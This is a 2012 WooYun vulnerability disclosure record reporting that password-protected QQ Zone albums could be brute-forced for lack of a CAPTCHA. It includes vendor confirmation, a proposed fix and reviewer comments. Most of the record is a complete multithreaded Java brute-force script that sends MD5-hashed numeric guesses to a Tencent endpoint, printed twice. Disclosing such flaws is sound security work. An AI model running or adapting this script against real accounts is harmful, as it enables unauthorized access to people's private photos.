{"id": 16804, "wybug_id": "wooyun-2012-011970", "wybug_title": "腾讯QQ空间加密相册穷举破解...", "wybug_corp": "腾讯", "wybug_author": "shack2", "wybug_date": "2012-09-10 14:31", "wybug_open_date": "2012-10-25 14:31", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-09-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-09-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-10-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-10-25：\t细节向公众公开  简要描述： 对有权限访问的QQ空间加密相册可以穷举破解.... 详细说明：  \n\n\n\n\n\n\n\ncheck破解类：\npackage com.test;import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;import java.net.HttpURLConnection;import java.net.URL;import java.util.Date;/*** * @author  线程类 */public class Check extends Thread {\tprivate String pass;\tpublic Check(String pass) {\t\tthis.pass = pass;\t}    // 验证密码url\tString httpUrl = \"http://xa.photo.qq.com/cgi-bin/common/cgi_view_album?singleurl=1&uin=1341413415&albumid=V10fl8eT3mFzob&t=0.10085723901044841&verifycode=&question=%E5%AF%86%E7%A0%81%E6%98%AF%EF%BC%9F&output_type=json&refer=qzone&plat=qzone&json_esc=1&g_tk=5381&answer=\";\t// 自定义的线程\tpublic void run() {\t\ttry {\t\t\t// 定义一个输入流\t\t\tInputStream in;\t\t\thttpUrl += MD5.getMd5Str(pass);\t\t\t// 实例一个URL对象\t\t\tURL url = new URL(httpUrl);\t\t\t// 创建一个http请求连接\t\t\tHttpURLConnection connection = (HttpURLConnection) url.openConnection();\t\t\t// 设置请求头信息\t\t\tconnection.setRequestProperty(\"User-Agent\", \"Mozilla/4.0\");\t\t\t// 请求\t\t\tconnection.connect();\t\t\t// 得到输入流\t\t\tin = connection.getInputStream();\t\t\t// 读取内容\t\t\tBufferedReader reader = new BufferedReader(new InputStreamReader(in, \"GBK\"));\t\t\t\t\t\tboolean passok = true;// 假设密码正确\t\t\tString tempstr;\t\t\twhile ((tempstr = reader.readLine()) != null) {\t\t\t\tSystem.out.println(tempstr);\t\t\t\tif (tempstr.indexOf(\"回答错误\") > 0) {\t\t\t\t\tpassok = false;\t\t\t\t\tbreak;\t\t\t\t}\t\t\t}\t\t\t// 判断密码是否正确\t\t\tif (passok) {\t\t\t\tSystem.out.println(\"ok,恭喜密码破解成功！密码：\" + pass);\t\t\t\tSystem.out.println(\"用时:\"+ ((new Date().getTime() - TestMain.start) / 1000)+ \"秒\");\t\t\t\t// 停止程序\t\t\t\tSystem.exit(0);\t\t\t} else {\t\t\t\tSystem.out.println(pass);\t\t\t}\t\t\treader.close();\t\t\tin.close();\t\t\t// TimeUnit.MILLISECONDS.sleep(50);\t\t} catch (Exception e) {\t\t\tSystem.out.println(\"出了点小问题。\");\t\t}\t}}\nMD5加密类：\npackage com.test;import java.security.MessageDigest;public class MD5 {\tpublic static String getMd5Str(String str){\t\ttry {\t\t\t  MessageDigest md = MessageDigest.getInstance(\"MD5\");\t\t\t  md.update(str.getBytes());\t\t\t  byte b[] = md.digest();\t\t\t  int i;\t\t\t  StringBuffer buf = new StringBuffer(\"\");\t\t\t  for (int offset = 0; offset < b.length; offset++) {\t\t\t   i = b[offset];\t\t\t   if (i < 0)\t\t\t    i += 256;\t\t\t   if (i < 16)\t\t\t     buf.append(\"0\");\t\t\t   buf.append(Integer.toHexString(i));\t\t\t  }\t\t\t  //将小写全转换成大写\t\t\t  return buf.toString().toUpperCase();\t              \t    } catch (Exception e) {\t     \t    } \t    return \"\";\t }\tpublic static void main(String[] args) {\t\tSystem.out.println(getMd5Str(\"8888\"));\t}\t}\nMain方法测试类：\npackage com.test;import java.util.Date;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;/*** * @author Administrator * 测试类 */public class TestMain {\t//每次100个线程\tpublic static final int THREADPOOL_SIZE = 100;\t\tpublic static ExecutorService exec = Executors.newFixedThreadPool(THREADPOOL_SIZE);\t//线程池\t\t//数字密码\tpublic static int index=1;\t\t//开始时间\tpublic static long start= new Date().getTime();\t\tpublic static void main(String[] args) {\t\ttry {\t\t\t//List list =ReadFile.read();\t\t\twhile(index<=9000){\t\t\t\t\t\t\t\t\t//执行破解线程\t\t\t\t\texec.execute(new Check(index+\"\"));\t\t\t\t\tindex++;\t\t\t\t//主线程休息一会儿\t\t\t\t//TimeUnit.MILLISECONDS.sleep(200);\t\t\t\t}\t\t\t\t\t} catch (Exception e) {\t\t\t\t\t\tSystem.out.println(\"程序异常...\");\t\t\t\t\t}\t}\t}\n   漏洞证明：  \n\n\n\n\n\n\n\ncheck破解类：\npackage com.test;import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;import java.net.HttpURLConnection;import java.net.URL;import java.util.Date;/*** * @author  线程类 */public class Check extends Thread {\tprivate String pass;\tpublic Check(String pass) {\t\tthis.pass = pass;\t}    // 验证密码url\tString httpUrl = \"http://xa.photo.qq.com/cgi-bin/common/cgi_view_album?singleurl=1&uin=1341413415&albumid=V10fl8eT3mFzob&t=0.10085723901044841&verifycode=&question=%E5%AF%86%E7%A0%81%E6%98%AF%EF%BC%9F&output_type=json&refer=qzone&plat=qzone&json_esc=1&g_tk=5381&answer=\";\t// 自定义的线程\tpublic void run() {\t\ttry {\t\t\t// 定义一个输入流\t\t\tInputStream in;\t\t\thttpUrl += MD5.getMd5Str(pass);\t\t\t// 实例一个URL对象\t\t\tURL url = new URL(httpUrl);\t\t\t// 创建一个http请求连接\t\t\tHttpURLConnection connection = (HttpURLConnection) url.openConnection();\t\t\t// 设置请求头信息\t\t\tconnection.setRequestProperty(\"User-Agent\", \"Mozilla/4.0\");\t\t\t// 请求\t\t\tconnection.connect();\t\t\t// 得到输入流\t\t\tin = connection.getInputStream();\t\t\t// 读取内容\t\t\tBufferedReader reader = new BufferedReader(new InputStreamReader(in, \"GBK\"));\t\t\t\t\t\tboolean passok = true;// 假设密码正确\t\t\tString tempstr;\t\t\twhile ((tempstr = reader.readLine()) != null) {\t\t\t\tSystem.out.println(tempstr);\t\t\t\tif (tempstr.indexOf(\"回答错误\") > 0) {\t\t\t\t\tpassok = false;\t\t\t\t\tbreak;\t\t\t\t}\t\t\t}\t\t\t// 判断密码是否正确\t\t\tif (passok) {\t\t\t\tSystem.out.println(\"ok,恭喜密码破解成功！密码：\" + pass);\t\t\t\tSystem.out.println(\"用时:\"+ ((new Date().getTime() - TestMain.start) / 1000)+ \"秒\");\t\t\t\t// 停止程序\t\t\t\tSystem.exit(0);\t\t\t} else {\t\t\t\tSystem.out.println(pass);\t\t\t}\t\t\treader.close();\t\t\tin.close();\t\t\t// TimeUnit.MILLISECONDS.sleep(50);\t\t} catch (Exception e) {\t\t\tSystem.out.println(\"出了点小问题。\");\t\t}\t}}\nMD5加密类：\npackage com.test;import java.security.MessageDigest;public class MD5 {\tpublic static String getMd5Str(String str){\t\ttry {\t\t\t  MessageDigest md = MessageDigest.getInstance(\"MD5\");\t\t\t  md.update(str.getBytes());\t\t\t  byte b[] = md.digest();\t\t\t  int i;\t\t\t  StringBuffer buf = new StringBuffer(\"\");\t\t\t  for (int offset = 0; offset < b.length; offset++) {\t\t\t   i = b[offset];\t\t\t   if (i < 0)\t\t\t    i += 256;\t\t\t   if (i < 16)\t\t\t     buf.append(\"0\");\t\t\t   buf.append(Integer.toHexString(i));\t\t\t  }\t\t\t  //将小写全转换成大写\t\t\t  return buf.toString().toUpperCase();\t              \t    } catch (Exception e) {\t     \t    } \t    return \"\";\t }\tpublic static void main(String[] args) {\t\tSystem.out.println(getMd5Str(\"8888\"));\t}\t}\nMain方法测试类：\npackage com.test;import java.util.Date;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;/*** * @author Administrator * 测试类 */public class TestMain {\t//每次100个线程\tpublic static final int THREADPOOL_SIZE = 100;\t\tpublic static ExecutorService exec = Executors.newFixedThreadPool(THREADPOOL_SIZE);\t//线程池\t\t//数字密码\tpublic static int index=1;\t\t//开始时间\tpublic static long start= new Date().getTime();\t\tpublic static void main(String[] args) {\t\ttry {\t\t\t//List list =ReadFile.read();\t\t\twhile(index<=9000){\t\t\t\t\t\t\t\t\t//执行破解线程\t\t\t\t\texec.execute(new Check(index+\"\"));\t\t\t\t\tindex++;\t\t\t\t//主线程休息一会儿\t\t\t\t//TimeUnit.MILLISECONDS.sleep(200);\t\t\t\t}\t\t\t\t\t} catch (Exception e) {\t\t\t\t\t\tSystem.out.println(\"程序异常...\");\t\t\t\t\t}\t}\t}\n   修复方案：  增加验证码机制....   版权声明：转载请注明来源 shack2@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2012-09-10 16:09 厂商回复： 感谢反馈，我们正在跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-09-10 14:35 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  = = 难道有某个接口没加验证码？ 这里我记得应该是有验证码的。。    \n     2012-09-10 14:49 |    \t\tshack2 \t\t\t( 普通白帽子  |\t\t\t        Rank:470 漏洞数:71        | QQ:1341413415 一个热爱编程(Java),热爱网...)\t\t \n  @gainover 这个没验证码机制，前面我我跑了几万次都没验证码...    \n     2012-09-10 16:27 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @gainover 哟 暴露了吧    \n     2012-09-10 16:30 |    \t\tshack2 \t\t\t( 普通白帽子  |\t\t\t        Rank:470 漏洞数:71        | QQ:1341413415 一个热爱编程(Java),热爱网...)\t\t \n  @xsser 嘿嘿...    \n     2012-09-10 16:36 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser = = 你老别想歪了～～     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}